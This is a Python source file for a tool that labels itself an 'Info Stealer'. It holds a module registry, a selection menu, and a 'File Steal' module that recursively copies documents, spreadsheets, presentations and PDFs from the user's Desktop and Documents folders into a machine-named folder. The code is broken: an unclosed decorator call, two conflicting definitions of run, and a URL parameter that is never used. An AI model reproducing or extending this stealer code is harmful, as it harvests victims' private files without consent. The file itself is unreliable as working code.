import os
import shutil
import platform
from dataclasses import dataclass
from typing import Callable


@dataclass
class RegisteredModule:
    code: str
    name: str
    description: str
    handler: Callable[[str], object]


MODULES: dict[str, RegisteredModule] = {}


def register_module(code: str, name: str, description: str):
    def decorator(function: Callable[[str], object]):
        MODULES[code] = RegisteredModule(
            code=code,
            name=name,
            description=description,
            handler=function,
        )
        return function

    return decorator


@register_module(
    "01",
    "File Steal",
    "This module is made for stealing file data from URL'S.",

def collect_files():
    home_path = os.path.expanduser("~")
    pc_name = platform.uname().nodename
    save_path = os.path.join(home_path, pc_name)

    if not os.path.exists(save_path):
        os.mkdir(save_path)

    file_extensions = (".docx", ".txt", ".doc", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf")
    desktop_path = os.path.join(home_path, "Desktop")
    documents_path = os.path.join(home_path, "Documents")

    def copy_files(source_root, dest_root):
        for root, dirs, files in os.walk(source_root):
            for file in files:
                if file.endswith(file_extensions):
                    source_path = os.path.join(root, file)
                    relative_path = os.path.relpath(source_path, source_root)
                    destination_dir = os.path.join(dest_root, os.path.dirname(relative_path))
                    os.makedirs(destination_dir, exist_ok=True)
                    destination_path = os.path.join(destination_dir, os.path.basename(file))
                    shutil.copy(source_path, destination_path)

    copy_files(desktop_path, os.path.join(save_path, "dosyalar"))
    copy_files(documents_path, os.path.join(save_path, "dosyalar"))

def run(url=""):
    from core.logger import save_log
    from core.ui import console, module_header, pause

    console.print(f"[bold cyan]File Collection Module[/bold cyan]")
    if url:
        console.print(f"URL fornecida: {url}")
        # Aqui você pode usar a URL na sua lógica, se necessário
    else:
        console.print("Nenhuma URL fornecida.")

    module_header("File Collection", "Data Gathering")
    collect_files()

    path = os.path.join(os.path.expanduser("~"), platform.uname().nodename)
    save_log("file_collection", path, {"status": "completed"})
    console.print(f"[dim]File collection completed and logged at {path}[/dim]")
    pause()


def execute_module(module: RegisteredModule, url: str):
    try:
        result = module.handler(url)
        return {
            "module": module.name,
            "success": True,
            "result": result,
        }
    except Exception as error:
        return {
            "module": module.name,
            "success": False,
            "error": str(error),
        }


def render_result(console, result: dict):
    if not result["success"]:
        console.print(f"[red]Failed:[/red] {result.get('error')}")
        return

    console.print("[green]Completed[/green]")
    data = result.get("result")

    if isinstance(data, dict):
        for key, value in data.items():
            console.print(f"  [dim]{key}:[/dim] {value}")
    elif data is not None:
        console.print(str(data))


def run(url=""):
    from core.ui import console, module_header, pause

    while True:
        module_header("Info Stealer", "Module Registry")

        for code in sorted(MODULES):
            module = MODULES[code]
            console.print(f"[cyan][{module.code}][/cyan] [bold]{module.name}[/bold]")
            console.print(f"     [dim]{module.description}[/dim]")

        console.print("[cyan][00][/cyan] Back")
        console.print()

        choice = console.input("[bold cyan]Select:[/bold cyan] ").strip()

        if choice == "00":
            return

        module = MODULES.get(choice)

        if module is None:
            console.print("[red]Invalid option.[/red]")
            pause()
            continue

        target_url = url.strip() if url else ""

        if not target_url:
            target_url = console.input("[bold cyan]URL:[/bold cyan] ").strip()

        if not target_url:
            console.print("[red]URL is required.[/red]")
            pause()
            continue

        console.print()
        console.print(f"[bold]{module.name}[/bold]")
        console.print(f"[dim]Target: {target_url}[/dim]")

        result = execute_module(module, target_url)
        render_result(console, result)
        pause()
